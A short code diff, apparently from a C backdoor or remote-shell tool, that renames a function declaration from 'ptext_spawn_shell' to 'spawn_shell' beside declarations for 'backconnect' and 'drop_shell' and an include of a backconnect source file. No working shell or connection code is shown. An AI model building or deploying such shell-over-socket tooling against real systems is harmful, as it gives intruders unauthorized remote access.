@@ -10,7 +10,7 @@
 #endif
 #define METHOD_PLAINTEXT 1
 
-void ptext_spawn_shell(int sockfd);
+void spawn_shell(int sockfd);
 void backconnect(int method, int sockfd);
 int drop_shell(int method, int sockfd);
 #include "accept/backconnect.c"
